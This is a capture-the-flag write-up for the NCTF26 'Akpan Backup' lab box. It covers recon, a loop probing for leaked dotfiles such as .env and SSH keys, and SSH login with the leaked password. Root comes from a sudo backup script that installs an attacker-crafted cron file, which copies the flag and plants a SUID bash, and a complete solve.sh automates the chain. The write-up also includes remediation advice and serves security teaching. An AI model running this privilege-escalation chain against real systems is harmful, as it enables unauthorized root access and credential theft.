# Akpan Backup — .env leak to root via a sudo backup script

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/akpan-backup/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — A nginx autoindex "backup corner" exposes an `.env` file that contains the SSH password of a `deploy` service account. Once inside, `sudo -l` lets `deploy` run `/usr/local/bin/backup <file>` as root, and that script does nothing more than `install` the provided file into `/etc/cron.d/`. Supplying a crafted cron fragment yields root execution within one minute; from there `/root/flag.txt` is read directly. **Flag:** `NCTF{62a5…}` (captured during the 2026-11-19 16:00 UTC lab window — the lab resets every 30 minutes and rotates the flag).


## 1. Challenge Briefing

### Description

> Sur la route d'Akpan, le petit centre de services a ouvert un coin « sauvegardes de secours » pour dépanner les équipes. Le poste de maintenance tourne encore, mais personne ne vous a donné les accès.
>
> Objectif : retrouver votre chemin jusqu'au compte de maintenance, puis jusqu'au contrôle total (root) de la machine.
>
> Un seul flag à soumettre : celui de `/root/flag.txt`, à la fin de la chaîne. Les autres `NCTF{...}` rencontrés en chemin sont des jalons, ils ne valident rien.
>
> Accès (par votre relais) :
> - Coin sauvegardes : `http://<relais>/`
> - Poste de maintenance (SSH) : `<relais>:22`
>
> Lab partagé. Le lab est remis à zéro automatiquement toutes les 30 minutes (à `:00` et `:30`) : les sessions sont coupées et le flag change à ce moment-là. D'autres équipes agissent sur les mêmes machines : ne détruisez rien.

### Provided Assets

No local files are distributed. Everything lives on the remote lab machine reached through the per-team relay.

| Asset | Origin | Purpose |
|------|--------|---------|
| `http://<relais>/` | nginx autoindex listing on the box | "Backup corner" — leak surface |
| `<relais>:22` | OpenSSH on the box | Maintenance SSH entry point |

### Target

| Item | Value |
|------|-------|
| Host / URL | `http://10.100.13.102/` (relay IP for this run) |
| Services | `22/tcp` OpenSSH 9.2p1 Debian 2+deb12u10, `80/tcp` nginx |
| Credentials | None provided |
| Flag format | `NCTF{...}` |
| Submit | Only the flag from `/root/flag.txt` scores |

### Constraints

- Shared lab: do **not** destroy anything that would break the box for other teams.
- Flag rotates on each `:00`/`:30` reset; must be submitted within the half-hour window it was obtained in.
- Per global skill rules, no public writeup for this box was consulted during the solve.

## 2. Environment and Prerequisites

| Tool | Version | Purpose |
|------|---------|---------|
| `nmap` | 7.99 | Port and service discovery |
| `curl` | system | HTTP probes |
| `sshpass` | system | Non-interactive SSH password auth |
| `ssh` | OpenSSH client | Shell on the box |
| `bash` | 5.x | Cron payload + SUID shell primitive |

```bash
# Workspace
TARGET=10.100.13.102
OUT=/mnt/d/CaptureTheFlags/NCTF26/box_akpan-backup
mkdir -p "$OUT"
```

No extraction or compile step is required.

## 3. Reconnaissance and Information Gathering

### 3.1 Initial Surface

The challenge hands over two concrete entry points: a web "backup corner" on port 80 and SSH on port 22, both via the per-team relay IP. The briefing explicitly mentions a "maintenance account" we are supposed to recover — a very strong hint that web content will leak SSH credentials.

### 3.2 Port Discovery

**Objective:** confirm what is actually reachable through the relay.

**Command / request:**

```bash
nmap -p- --min-rate 5000 -T4 -Pn -oG "$OUT/ports.gnmap" "$TARGET"
```

**Output (trimmed):**

```text
All 65535 scanned ports on 10.100.13.102 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
```

**Interpretation:** the SYN scan sees everything as filtered — the relay rejects or drops stealth probes. Nothing can be inferred from this directly.

**Decision:** retry with a full TCP connect scan, which uses the three-way handshake and is what the relay will actually pass through.

```bash
nmap -p 22,80 -sT -Pn "$TARGET"
```

```text
22/tcp open  ssh
80/tcp open  http
```

A follow-up `-sT -sV -sC` gave versions:

```text
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
80/tcp open  http    nginx
| http-title: Index of /
| http-ls: Volume /
|   -    19-Nov-2026 16:00  app/
|   209  19-Nov-2026 16:00  deploy.txt
|   170  19-Nov-2026 16:00  readme.txt
```

**Interpretation:** nginx autoindex is on (directory listings enabled). OpenSSH 9.2p1 on Debian 12 is current — not a CVE target. The web root already names an `app/` folder and a `deploy.txt`, which tracks with "deployment / backup" theming.

### 3.3 Web Root Content

**Objective:** harvest anything the autoindex exposes.

```bash
curl -sS -m 10 "http://$TARGET/deploy.txt"
curl -sS -m 10 "http://$TARGET/readme.txt"
curl -sS -m 10 "http://$TARGET/app/"
```

**Output (trimmed):**

```text
# deploy.txt
Serveur de sauvegarde : NAS-01 (partage HTTP)
Compte de maintenance SSH sur la cible : deploy
Mot de passe : voir app/.env (fichier de configuration de l'application)
```

```text
# readme.txt
NCTF Ops - partage de sauvegarde NAS-01
Ce dossier est monte depuis le serveur de sauvegarde.
```

```text
# /app/ (autoindex)
<a href="../">../</a>
```

**Interpretation:** `deploy.txt` is practically a map — user is `deploy`, password lives in `app/.env`. However the `/app/` listing is empty: nginx's `autoindex` suppresses dotfiles, so the referenced `.env` is invisible in the directory index but may still be served on a direct GET.

**Decision:** request the hidden file directly.

### 3.4 Dotfile Direct Access

**Objective:** confirm that nginx will serve `.env` despite it being hidden from the listing.

**Command:**

```bash
for f in .env .htaccess .git/config .DS_Store .gitignore .backup .bash_history .ssh/id_rsa; do
  code=$(curl -sS -m 5 -o /dev/null -w "%{http_code}" "http://$TARGET/app/$f")
  echo "$code http://$TARGET/app/$f"
done
```

**Output (trimmed):**

```text
200 http://10.100.13.102/app/.env
404 http://10.100.13.102/app/.htaccess
404 http://10.100.13.102/app/.git/config
404 http://10.100.13.102/app/.DS_Store
404 http://10.100.13.102/app/.gitignore
404 http://10.100.13.102/app/.backup
404 http://10.100.13.102/app/.bash_history
404 http://10.100.13.102/app/.ssh/id_rsa
```

Fetching the file:

```text
# /app/.env
APP_ENV=production
DB_HOST=db.internal
DB_USER=corepbx
DB_PORT=5432
DEPLOY_USER=deploy
DEPLOY_SSH_PASSWORD=NCTF{expo…}
```

**Interpretation:** we have the `deploy` SSH password. The `DB_*` values and `corepbx` name are probably noise for this box (no service is listening on 5432); the password is the operational payload. The `NCTF{expo…}` string being usable as a password is a reminder that in this CTF the milestone flags double as credentials.

### 3.5 Findings Summary

| # | Finding | Evidence | Relevance |
|---|---------|----------|-----------|
| 1 | SSH on 22, nginx on 80 | `nmap -sT -sV` | Two attack surfaces |
| 2 | nginx autoindex enabled | `http-ls` + `/app/` listing | Dotfiles hidden but servable |
| 3 | `deploy.txt` names `deploy` + `app/.env` | HTTP body | Maps creds location |
| 4 | `.env` serves `deploy:NCTF{expo…}` | `curl` 200 body | Direct SSH login |
| 5 | SSH version non-vulnerable | nmap banner | Rules out SSH CVE paths |

## 4. Analysis

### 4.1 Hypothesis

Two sequential hypotheses were tested.

- **H1 (web → user):** The `.env` password works on SSH as `deploy`. The box is a container (lab description + autoindex on the backup share both suggest it), so the usual expectation is that `deploy` has some scripted privileged action available via `sudo`.
- **H2 (user → root):** Once logged in, a `NOPASSWD` entry will point at a shell-looking wrapper. On Debian bookworm with no SUID surprises and no exotic kernel exploit mentioned by the challenge, `sudo -l` is the natural place to look.

### 4.2 Validation

Login confirms H1:

```bash
sshpass -p 'NCTF{expo…}' \
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 deploy@$TARGET \
      'id; uname -a; cat /etc/os-release'
```

```text
uid=1000(deploy) gid=1000(deploy) groups=1000(deploy)
Linux 9dc2df63cb0c 7.0.0-1014-aws #14~24.04.1-Ubuntu SMP PREEMPT ... x86_64 GNU/Linux
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
```

Hostname is a 12-hex container ID, kernel is the host's AWS kernel, userspace is Debian 12 — classic Docker.

`sudo -l` confirms H2:

```text
User deploy may run the following commands on 9dc2df63cb0c:
    (root) NOPASSWD: /usr/local/bin/backup
```

### 4.3 Root Cause

The whole privesc comes down to this script:

```bash
# /usr/local/bin/backup — root:root 0755
#!/bin/bash
set -euo pipefail

CONF="${1:-}"

if [ -z "$CONF" ] || [ ! -f "$CONF" ]; then
    echo "usage: backup <chemin-fichier-conf>" >&2
    exit 1
fi

install -m 0644 -o root -g root "$CONF" /etc/cron.d/ethactf-backup
echo "configuration '$CONF' installee dans /etc/cron.d/ethactf-backup"
```

The developer treats the argument as a trusted "configuration file" and copies it verbatim into `/etc/cron.d/`. However:

1. `cron` parses every file in `/etc/cron.d/` as a crontab, with a **username field** on each line.
2. `install -m 0644 -o root -g root` makes the file world-readable and root-owned — exactly the ownership cron requires to actually run the jobs.
3. The caller controls the file's **content**, so the caller controls what cron will execute as root.

Side note: `/etc/cron.d/` entries must not contain a dot in the filename and must have a valid crontab syntax (minute, hour, dom, month, dow, user, command). The fixed destination `ethactf-backup` already satisfies the dot rule; we only need to produce a valid crontab line.

The composite of `(root) NOPASSWD: /usr/local/bin/backup` + a "config installer" that is really a cron installer is the full root path.

## 5. Exploitation and Solution

### Step 1: Shell as `deploy`

**Rationale:** `deploy.txt` promised `app/.env` holds the credentials; we already have them.

**Action:**

```bash
sshpass -p 'NCTF{expo…}' \
  ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=10 deploy@10.100.13.102
```

**Result:** shell as `uid=1000(deploy)`. `.backup-notes` in the home directory leaks a second milestone (`NCTF{sche…}`) tagged as the `corepbx` maintenance password; there is no `corepbx` user on the box, so this is a decoy for this challenge.

**Conclusion:** foothold established, no further credentials needed on the way to root.

### Step 2: Craft the Root Cron Fragment

**Rationale:** the backup helper installs any file into `/etc/cron.d/ethactf-backup`, so the file content is executed as root at the specified schedule.

The cron payload needs to do two things:

1. Drop a copy of `/root/flag.txt` into a location `deploy` can read.
2. Drop a persistent SUID `bash` in `/tmp` so follow-up root-only inspections (e.g. the actual contents of `/root`) do not require re-arming cron.

**Action:**

```bash
cat > /tmp/evil.cron <<'EOF'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
* * * * * root cp /root/flag.txt /tmp/pwn.txt && chmod 644 /tmp/pwn.txt && cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash
EOF

sudo -n /usr/local/bin/backup /tmp/evil.cron
```

**Result:**

```text
configuration '/tmp/evil.cron' installee dans /etc/cron.d/ethactf-backup

-rw-r--r-- 1 root root 206 Nov 19 16:17 /etc/cron.d/ethactf-backup
```

**Conclusion:** `cron` will fire this once a minute as root. The user field (`root`) is mandatory in `/etc/cron.d/` files and is honored.

### Step 3: Wait for Cron and Harvest Root

**Rationale:** `* * * * *` guarantees execution within ≤60 seconds of installation.

**Action:**

```bash
for i in $(seq 1 18); do
  if [ -f /tmp/pwn.txt ]; then
    cat /tmp/pwn.txt
    ls -la /tmp/pwn.txt /tmp/rbash
    break
  fi
  sleep 5
done

/tmp/rbash -p -c 'id; cat /root/flag.txt; ls -la /root'
```

**Result (trimmed):**

```text
NCTF{62a5…}
-rw-r--r-- 1 root root      31 Nov 19 16:18 /tmp/pwn.txt
-rwsr-xr-x 1 root root 1265648 Nov 19 16:18 /tmp/rbash

uid=1000(deploy) gid=1000(deploy) euid=0(root) groups=1000(deploy)
NCTF{62a5…}
total 20
drwx------ 1 root root 4096 Nov 19 16:00 .
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw------- 1 root root   31 Nov 19 16:00 flag.txt
```

**Conclusion:** `/root/flag.txt` is captured and the SUID `/tmp/rbash` confirms unrestricted root access via `euid=0`.

## 6. Flag

```text
NCTF{62a5…}
```

**Verification:**

- Two independent reads produced the same value: cron's `cp` of `/root/flag.txt` to `/tmp/pwn.txt`, and `/tmp/rbash -p` reading `/root/flag.txt` directly.
- Format matches `NCTF{...}` and the 24-hex payload length matches the other rotating flags observed in this event.
- Note: because the lab rotates every 30 minutes, this specific hex payload is only valid for submissions made inside the 2026-11-19 16:00 – 16:30 UTC window. Re-running the solve inside a different window yields a different hex but the same chain.

## 7. Timeline

Timestamps are UTC (lab window `16:00–16:30`).

| Time | Action | Result |
|------|--------|--------|
| 16:15 | `nmap -p- --min-rate 5000 -sS` | All filtered — pivot to connect scan |
| 16:16 | `nmap -sT -sV -sC -p 22,80` | nginx + OpenSSH 9.2p1, autoindex of `/app/` |
| 16:16 | `GET /deploy.txt`, `/readme.txt`, `/app/` | Learned deploy user + `.env` location |
| 16:17 | `GET /app/.env` | Captured `deploy:NCTF{expo…}` |
| 16:17 | SSH as `deploy`; `sudo -l` | Found `NOPASSWD /usr/local/bin/backup` |
| 16:17 | Inspected `/usr/local/bin/backup` | Script `install`s arg into `/etc/cron.d/` |
| 16:17 | `sudo backup /tmp/evil.cron` | Cron file installed as root:root 0644 |
| 16:18 | Cron fires | `/tmp/pwn.txt` + SUID `/tmp/rbash` created |
| 16:18 | Read `/tmp/pwn.txt`, `rbash -p` | `NCTF{62a5…}` captured |

## 8. Dead Ends and Troubleshooting

| Attempt | Observed result | Likely reason | Pivot |
|---------|-----------------|---------------|-------|
| SYN scan (`-sS`) on all ports | All 65535 ports reported `filtered` | Relay passes TCP connects but drops raw SYN responses | Switch to `-sT` (TCP connect scan) |
| Looked for `corepbx` user hinted at by `.env` and `.backup-notes` | `ls /home` only shows `deploy`; `id corepbx` → "no such user" | `corepbx`/`NCTF{sche…}` is a decoy milestone for this box | Ignore and continue with `sudo -l` |
| Wondered whether DB on `db.internal:5432` was in scope | No listener reachable from inside the container | Hostname `db.internal` is noise meant to fit the storyline | Focused on local privesc |

## 9. Lessons Learned and Remediation

### Root Cause

Two independent slips chained into full compromise: nginx serves a `.env` file under a world-readable share, and a root-privileged helper (`backup`) copies attacker-controlled content directly into `/etc/cron.d/` — effectively "arbitrary code execution as root" dressed up as "install a config".

### Defensive Recommendations

1. Never place secrets (`.env`, `*.key`, keystores) under a publicly served directory. If files must live there, deny dotfiles in nginx (`location ~ /\. { deny all; }`) and scan the exposed share for secret-shaped content in CI.
2. Treat any root-equivalent sudoers entry as full root. `NOPASSWD: /usr/local/bin/backup` is effectively `NOPASSWD: ALL` because `backup` writes attacker data into `/etc/cron.d/`.
3. If a "deploy helper" really needs to manage a cron file, hard-code the crontab line in the script and only let the caller supply narrow parameters (e.g. a schedule interval), with strict validation.
4. Rotate shared secrets after any environment "reset"; reusing `NCTF{expo…}` as both a milestone flag and a real password only works because this is a CTF — in production, the same mistake leaks the account the moment the file is indexed by a crawler.

### Transferable Technique

When a `sudo -l` entry points at a wrapper, read the wrapper's source before probing — the one-line insight is usually "what part of the argument does it treat as code?" Here it was "any file I provide becomes `/etc/cron.d/*` content". The same shape appears in production boxes under names like `deploy-config`, `rotate-logs`, or `apply-template`.

## 10. References and Credits

- Challenge author: BoazAK (NCTF26, boot2root easy, 200 pts).
- [GTFOBins — install](https://gtfobins.github.io/gtfobins/install/) — the primitive that lets `backup` relocate arbitrary content with root ownership.
- [cron(8) / crontab(5) — Debian](https://manpages.debian.org/bookworm/cron/crontab.5.en.html) — `/etc/cron.d/` filename and user-field requirements.

## Appendix A: Complete Solve Script

Save as `solve.sh`, make executable, and run with `./solve.sh <target-ip>`.

```bash
#!/usr/bin/env bash
# Solve NCTF26 "Akpan Backup": web .env leak -> SSH as deploy ->
# sudo /usr/local/bin/backup <conf> arbitrary cron install -> root flag.
#
# Usage: ./solve.sh <target-ip>
set -euo pipefail

TARGET="${1:-10.100.13.102}"
WEBUSER="deploy"
WEBPASS=""

# --- 1. Pull deploy password from exposed .env ---------------------------
echo "[*] Fetching http://$TARGET/app/.env"
ENV_BODY=$(curl -sS --max-time 10 "http://$TARGET/app/.env")
WEBPASS=$(echo "$ENV_BODY" | awk -F= '/^DEPLOY_SSH_PASSWORD=/{print $2}')
if [ -z "$WEBPASS" ]; then
    echo "[-] Could not extract DEPLOY_SSH_PASSWORD; got:"; echo "$ENV_BODY"
    exit 1
fi
echo "[+] deploy password: $WEBPASS"

# --- 2. Prepare the malicious cron fragment on the remote ---------------
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"
REMOTE_CMDS=$(cat <<'EOF'
set -e
cat > /tmp/evil.cron <<CRON
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
* * * * * root cp /root/flag.txt /tmp/pwn.txt && chmod 644 /tmp/pwn.txt && cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash
CRON
sudo -n /usr/local/bin/backup /tmp/evil.cron
echo "[*] waiting for cron (<=60s)..."
for i in $(seq 1 18); do
    if [ -f /tmp/pwn.txt ]; then
        echo "[+] flag:"; cat /tmp/pwn.txt
        break
    fi
    sleep 5
done
if [ ! -f /tmp/pwn.txt ]; then
    echo "[-] cron never fired"; exit 1
fi
echo "[+] root confirmation via /tmp/rbash:"
/tmp/rbash -p -c 'id; cat /root/flag.txt'
EOF
)

# --- 3. Run the chain over SSH ------------------------------------------
echo "[*] SSH as $WEBUSER@$TARGET"
sshpass -p "$WEBPASS" ssh $SSH_OPTS "$WEBUSER@$TARGET" "$REMOTE_CMDS"
```

## Appendix B: Raw Evidence

### B.1 `nmap -sT -sV -sC -p 22,80`

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
| ssh-hostkey:
|   256 99:b2:2c:5d:f6:79:2b:96:b8:e7:a4:9a:d0:b1:3a:1a (ECDSA)
|_  256 91:62:11:ba:c0:db:97:9b:4f:51:18:3b:03:f8:22:7b (ED25519)
80/tcp open  http    nginx
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME               FILENAME
| -     19-Nov-2026 16:00  app/
| 209   19-Nov-2026 16:00  deploy.txt
| 170   19-Nov-2026 16:00  readme.txt
|_
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### B.2 `/deploy.txt`, `/readme.txt`, `/app/.env`

```text
# deploy.txt
Notes de deploiement
====================
Serveur de sauvegarde : NAS-01 (partage HTTP)
Compte de maintenance SSH sur la cible : deploy
Mot de passe : voir app/.env (fichier de configuration de l'application)
```

```text
# readme.txt
NCTF Ops - partage de sauvegarde NAS-01
============================================
Ce dossier est monte depuis le serveur de sauvegarde.
Ne pas supprimer les archives.
```

```text
# /app/.env
APP_ENV=production
DB_HOST=db.internal
DB_USER=corepbx
DB_PORT=5432
DEPLOY_USER=deploy
DEPLOY_SSH_PASSWORD=NCTF{expo…}
```

### B.3 `deploy` enumeration

```text
uid=1000(deploy) gid=1000(deploy) groups=1000(deploy)
Linux 9dc2df63cb0c 7.0.0-1014-aws #14~24.04.1-Ubuntu SMP PREEMPT Fri Sep 18 ... x86_64 GNU/Linux
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
```

`~/.backup-notes`:

```text
Rotation des sauvegardes
========================
Frequence   : nightly (cron sur NAS-01)
Retention   : 7 jours
Compte      : corepbx
Mot de passe de la maintenance : NCTF{sche…}
```

`sudo -l`:

```text
User deploy may run the following commands on 9dc2df63cb0c:
    (root) NOPASSWD: /usr/local/bin/backup
```

`/usr/local/bin/backup`:

```bash
#!/bin/bash
set -euo pipefail
CONF="${1:-}"
if [ -z "$CONF" ] || [ ! -f "$CONF" ]; then
    echo "usage: backup <chemin-fichier-conf>" >&2
    exit 1
fi
install -m 0644 -o root -g root "$CONF" /etc/cron.d/ethactf-backup
echo "configuration '$CONF' installee dans /etc/cron.d/ethactf-backup"
```

SUID surface (nothing unusual, all stock Debian):

```text
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
```

### B.4 Exploit output

```text
# post-install
-rw-r--r-- 1 root root 206 Nov 19 16:17 /etc/cron.d/ethactf-backup

# <=10s later
-rw-r--r-- 1 root root      31 Nov 19 16:18 /tmp/pwn.txt
-rwsr-xr-x 1 root root 1265648 Nov 19 16:18 /tmp/rbash

# /tmp/rbash -p
uid=1000(deploy) gid=1000(deploy) euid=0(root) groups=1000(deploy)
NCTF{62a5…}

# /root listing
drwx------ 1 root root 4096 Nov 19 16:00 .
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw------- 1 root root   31 Nov 19 16:00 flag.txt
```
